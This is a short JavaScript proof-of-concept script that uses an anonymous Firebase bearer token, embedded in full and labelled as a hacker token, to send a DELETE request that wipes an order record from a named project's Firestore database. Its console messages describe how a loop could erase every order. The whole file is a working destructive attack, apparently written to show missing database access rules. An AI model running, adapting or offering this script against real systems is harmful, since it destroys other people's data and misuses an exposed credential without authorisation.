const HACKER_TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjNzQ5NTFmNjBhMDE0NzE3ZjFlMzA4ZDZiMjgwZjQ4ZjFlODhmZGEiLCJ0eXAiOiJKV1QifQ.eyJwcm92aWRlcl9pZCI6ImFub255bW91cyIsImlzcyI6Imh0dHBzOi8vc2VjdXJldG9rZW4uZ29vZ2xlLmNvbS9iYWZzZHZhcnNpdHkiLCJhdWQiOiJiYWZzZHZhcnNpdHkiLCJhdXRoX3RpbWUiOjE3NjQ5MDgyMDQsInVzZXJfaWQiOiJXOUYwd3BMSkpOVlZxV0NkYzlEV3h1WDYzc2sxIiwic3ViIjoiVzlGMHdwTEpKTlZWcVdDZGM5RFd4dVg2M3NrMSIsImlhdCI6MTc2NDkwODIwNCwiZXhwIjoxNzY0OTExODA0LCJmaXJlYmFzZSI6eyJpZGVudGl0aWVzIjp7fSwic2lnbl9pbl9wcm92aWRlciI6ImFub255bW91cyJ9fQ.DsP7xVlUEK4IqDjv9VbR3FkGDCt9JYHIDgKwMhWW0LdArDMw7K1_cGMtGtHuIhg3qTtHg-DOT1OfF45_Crl_3FC8XymMLVYpMTsQdAV5GV884ukRyafU0kKlMDfmx4CK109KEAKDUl2hQ5kXFnSn5q_uHhh6jvJpVPBB6pvB4asY2eivKXorTLHJo3c3nP9vu3TQDt43b30sVfRXLATngvAeeaxsswuu1cJnUj8ThHG9mwSXN8lhIbKYIwPUD1fo_89wrjxIIGx-v4zCBBJiOyfYRaitwb4ibw3ln_sN7WLHtzdW9TdEOQXr6fHHdRTj8xcEUsVB3yd95IJHqnICfg"; 
const PROJECT_ID = "bafsdvarsity";
// WARNING: This document will be deleted forever.
const TARGET_ORDER_ID = "PASTE_TARGET_ORDER_ID_HERE"; 

const PATH = `artifacts/bafsdvarsity/public/data/orders/${TARGET_ORDER_ID}`;
const url = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/${PATH}`;

console.log("🗑️ Attempting to DELETE data...");

fetch(url, {
  method: 'DELETE',
  headers: {
    'Authorization': 'Bearer ' + HACKER_TOKEN
  }
})
.then(res => {
  if (res.status === 200) {
    console.log("%c🚨 DELETION SUCCESSFUL!", "color: red; font-size: 20px; font-weight: bold;");
    console.log(`Order ${TARGET_ORDER_ID} has been wiped from the database.`);
    console.log("IMPACT: A hacker could write a loop to delete ALL your orders in 10 seconds.");
  } else {
    console.log("Deletion Failed (Status " + res + ")");
    res.json().then(d => console.log(d));
  }
});